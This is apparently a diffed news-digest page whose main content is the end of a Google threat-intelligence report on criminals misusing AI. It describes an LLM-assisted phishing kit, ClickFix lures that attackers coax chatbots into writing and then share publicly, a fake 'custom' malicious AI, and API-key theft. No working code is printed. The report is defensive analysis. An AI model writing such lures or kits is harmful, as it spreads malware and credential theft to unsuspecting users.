+HONESTCUE's use of a hard-coded prompt is not malicious in its own right, and, devoid of any context related to malware, it is unlikely that the prompt would be considered "malicious." Outsourcing a facet of malware functionality and leveraging an LLM to develop seemingly innocuous code that fits into a bigger, malicious construct demonstrates how threat actors will likely embrace AI applications to augment their campaigns while bypassing security guardrails.
+Figure 9: Example of a hard-coded prompt
+Figure 11: Example of a hard-coded prompt
+AI-Generated Phishing Kit: COINBAIT
+In November 2025, GTIG identified [COINBAIT](https://www.virustotal.com/gui/collection/0bfe8d133848734d730a219abd09a8404f47e4%20b446974be7ddcd288255ef1bb0), a phishing kit, whose construction was likely accelerated by AI code generation tools, masquerading as a major cryptocurrency exchange for credential harvesting. Based on direct infrastructure overlaps and the use of attributed domains, we assess with high confidence that a portion of this activity overlaps with UNC5356, a financially motivated threat cluster that makes use of SMS- and phone-based phishing campaigns to target clients of financial organizations, cryptocurrency-related companies, and various other popular businesses and services.
+An examination of the malware samples indicates the kit was built using the AI-powered platform Lovable AI based on the use of the lovableSupabase client and lovable.app for image hosting.
+-
+By hosting content on a legitimate, trusted service, the actor increases the likelihood of bypassing network security filters that would otherwise block the suspicious primary domain.
+-
+The phishing kit was wrapped in a full React Single-Page Application (SPA) with complex state management and routing. This complexity is indicative of code generated from high-level prompts (e.g., "Create a Coinbase-style UI for wallet recovery") using a framework like Lovable AI.
+-
+Another key indicator of LLM use is the presence of verbose, developer-oriented logging messages directly within the malware's source code. These messages—consistently prefixed with "? Analytics:"—provide a real-time trace of the kit's malicious tracking and data exfiltration activities and serve as a unique fingerprint for this code family.
+We also observed the group employ infrastructure and evasion tactics for their operations, including proxying phishing domains through Cloudflare to obscure the attacker IP addresses and hotlinking image assets in phishing pages directly from Lovable AI.
+The introduction of the COINBAIT phishing kit would represent an evolution in UNC5356's tooling, demonstrating a shift toward modern web frameworks and legitimate cloud services to enhance the sophistication and scalability of their social engineering campaigns. However, there is at least some evidence to suggest that COINBAIT may be a service provided to multiple disparate threat actors.
+Cyber Crime Use of AI Tooling
+In addition to misusing existing AI-enabled tools and services across the industry, there is a growing interest and marketplace for AI tools and services purpose-built to enable illicit activities. Tools and services offered via underground forums can enable low-level actors to augment the frequency, scope, efficacy, and complexity of their intrusions despite their limited technical acumen and financial resources. While financially motivated threat actors continue experimenting, they have not yet made breakthroughs in developing AI tooling.
+Threat Actors Leveraging AI Services for Social Engineering in 'ClickFix' Campaigns
+While not a new malware technique, GTIG observed instances in which threat actors abused the public's trust in generative AI services to attempt to deliver malware. GTIG identified a novel campaign where threat actors are leveraging the public sharing feature of generative AI services, including Gemini, to host deceptive social engineering content. This activity, first observed in early December 2025, attempts to trick users into installing malware via the well-established "ClickFix" technique. This ClickFix technique is used to socially engineer users to copy and paste a malicious command into the command terminal.
+The threat actors were able to bypass safety guardrails to stage malicious instructions on how to perform a variety of tasks on macOS, ultimately distributing variants of [ATOMIC](https://www.virustotal.com/gui/collection/dfd93a4d19773adacd2140f49ef12a7f33613f560cc7609638becac2d9c86900/iocs), an information stealer that targets the macOS environment and has the ability to collect browser data, cryptocurrency wallets, system information, and files in the Desktop and Documents folders. The threat actors behind this campaign have used a wide range of AI chat platforms to host their malicious instructions, including ChatGPT, CoPilot, DeepSeek, Gemini, and Grok.
+The campaign's objective is to lure users, primarily those on Windows and macOS systems, into manually executing malicious commands. The attack chain operates as follows:
+-
+A threat actor first crafts a malicious command line that, if copied and pasted by a victim, would infect them with malware.
+-
+Next, the threat actor manipulates the AI to create realistic-looking instructions to fix a common computer issue (e.g., clearing disk space or installing software), but gives the malicious command line to the AI as the solution.
+-
+Gemini and other AI tools allow a user to create a shareable link to specific chat transcripts so a specific AI response can be shared with others. The attacker now has a link to a malicious ClickFix landing page hosted on the AI service's infrastructure.
+-
+The attacker purchases malicious advertisements or otherwise directs unsuspecting victims to the publicly shared chat transcript.
+-
+The victim is fooled by the AI chat transcript and follows the instructions to copy a seemingly legitimate command-line script and paste it directly into their system's terminal. This command will download and install malware. Since the action is user initiated and uses built-in system commands, it may be harder for security software to detect and block.
+Figure 12: ClickFix attack chain
+There were different lures generated for Windows and MacOS, and the use of malicious advertising techniques for payload distribution suggests the targeting is likely fairly broad and opportunistic.
+This approach allows threat actors to leverage trusted domains to host their initial stage of instruction, relying on social engineering to carry out the final, highly destructive step of execution. While a widely used approach, this marks the first time GTIG observed the public sharing feature of AI services being abused as trusted domains.
+Observations from the Underground Marketplace: Threat Actors Abusing AI API Keys
+While legitimate AI services remain popular tools for threat actors, there is an enduring market for AI services specifically designed to support malicious activity. Current observations of English- and Russian-language underground forums indicates there is a persistent appetite for AI-enabled tools and services, which aligns [with our previous assessment of these platforms](https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools).
+However, threat actors struggle to develop custom models and instead rely on mature models such as Gemini. For example, "Xanthorox" is an underground toolkit that advertises itself as a custom AI for cyber offensive purposes, such as autonomous code generation of malware and development of phishing campaigns. The model was advertised as a "bespoke, privacy preserving self-hosted AI" designed to autonomously generate malware, ransomware, and phishing content. However, our investigation revealed that Xanthorox is not a custom AI but actually powered by several third-party and commercial AI products, including Gemini.
+This setup leverages a key abuse vector: the integration of multiple open-source AI products—specifically Crush, Hexstrike AI, LibreChat-AI, and Open WebUI—opportunistically leveraged via Model Context Protocol (MCP) servers to build an agentic AI service upon commercial models.
+In order to misuse LLMs services for malicious operations in a scalable way, threat actors need API keys and resources that enable LLM integrations. This creates a hijacking risk for organizations with substantial cloud resources and AI resources.
+In addition, vulnerable open-source AI tools are commonly exploited to steal AI API keys from users, thus facilitating a thriving black market for unauthorized API resale and key hijacking, enabling widespread abuse, and incurring costs for the affected users. For example, the One API and New API platform, popular with users facing country-level censorship, are regularly harvested for API keys by attackers, exploiting publicly known vulnerabilities such as default credentials, insecure authentication, lack of rate limiting, XSS flaws, and API key exposure via insecure API endpoints.
+Building AI Safely and Responsibly
+We believe our approach to AI must be both bold and responsible. That means developing AI in a way that maximizes the positive benefits to society while addressing the challenges. Guided by our [AI Principles](https://ai.google/responsibility/responsible-ai-practices/), Google designs AI systems with robust security measures and strong safety guardrails, and we continuously test the security and safety of our models to improve them.
+Our [policy guidelines](https://gemini.google/policy-guidelines/?hl=en) and prohibited use [policies](https://policies.google.com/terms/generative-ai/use-policy) prioritize safety and responsible use of Google's generative AI tools. Google's [policy development process](https://transparency.google/our-approach/our-policy-process/) includes identifying emerging trends, thinking end-to-end, and designing for safety. We continuously enhance safeguards in our products to offer scaled protections to users across the globe.
+At Google, [we leverage threat intelligence to disrupt](https://cloud.google.com/transform/how-google-does-it-threat-intelligence-uncover-track-cybercrime) adversary operations. We investigate abuse of our products, services, users, and platforms, including malicious cyber activities by government-backed threat actors, and work with law enforcement when appropriate. Moreover, our learnings from countering malicious activities are fed back into our product development to improve safety and security for our AI models. These changes, which can be made to both our classifiers and at the model level, are essential to maintaining agility in our defenses and preventing further misuse.
+Google DeepMind also develops threat models for generative AI to identify potential vulnerabilities and creates new evaluation and training techniques to address misuse. In conjunction with this research, Google DeepMind has shared how they're actively deploying defenses in AI systems, along with measurement and monitoring tools, including a robust evaluation framework that can automatically red team an AI vulnerability to indirect prompt injection attacks.
+Our AI development and Trust & Safety teams also work closely with our threat intelligence, security, and modelling teams to stem misuse.
+The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly. That's why we introduced the [Secure AI Framework (SAIF)](https://blog.google/technology/safety-security/introducing-googles-secure-ai-framework/), a conceptual framework to secure AI systems. We've shared a comprehensive [toolkit for developers](https://ai.google.dev/) with [resources and guidance](https://ai.google.dev/responsible) for designing, building, and evaluating AI models responsibly. We've also shared best practices for [implementing safeguards](https://ai.google.dev/responsible/docs/safeguards), [evaluating model safety](https://ai.google.dev/responsible/docs/evaluation#red-teaming), [red teaming](https://blog.google/technology/safety-security/googles-ai-red-team-the-ethical-hackers-making-ai-safer/) to test and secure AI systems, and our comprehensive [prompt injection approach](https://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html).
+Working closely with industry partners is crucial to building stronger protections for all of our users. To that end, we're fortunate to have strong collaborative partnerships with numerous researchers, and we appreciate the work of these researchers and others in the community to help us red team and refine our defenses.
+Google also continuously invests in AI research, helping to ensure [AI is built responsibly](https://ai.google/static/documents/ai-responsibility-update-published-february-2025.pdf), and that we're leveraging its potential to automatically find risks. Last year, we introduced [Big Sleep](https://blog.google/technology/safety-security/cybersecurity-updates-summer-2025/), an AI agent developed by Google DeepMind and Google Project Zero, that actively searches and finds unknown security vulnerabilities in software. Big Sleep has since found its first real-world security vulnerability and assisted in finding a vulnerability that was imminently going to be used by threat actors, which GTIG was able to cut off beforehand. We're also experimenting with AI to not only find vulnerabilities, but also patch them. We recently introduced [CodeMender](https://deepmind.google/discover/blog/introducing-codemender-an-ai-agent-for-code-security/), an experimental AI-powered agent using the advanced reasoning capabilities of our Gemini models to automatically fix critical code vulnerabilities.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included IOCs in a free [GTI Collection](https://www.virustotal.com/gui/collection/e72e3856e4c780078ba59c0a639b915fcab473e88f4701e16b36024d3d8c1578/summary) for registered users.
+About the Authors
+Google Threat Intelligence Group focuses on identifying, analyzing, mitigating, and eliminating entire classes of cyber threats against Alphabet, our users, and our customers. Our work includes countering threats from government-backed actors, targeted zero-day exploits, coordinated information operations (IO), and serious cyber crime networks. We apply our intelligence to improve Google's defenses and protect our users and customers.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-9" class="article-body">
+            <h2 class="article-title">Updates to the MSSQLHound OpenGraph Collector for BloodHound</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>tl;dr: MSSQLHound, a PowerShell script that collects security information from remote MSSQL Server instances, now scans them to determine whether or not NTLM relay attacks are possible, accounts for a recent privilege escalation vulnerability, and includes queries you can import into the BloodHound attack path graph to visualize, navigate, and remediate misconfigurations in MSSQL. Updates [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/">Updates to the MSSQLHound OpenGraph Collector for BloodHound</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
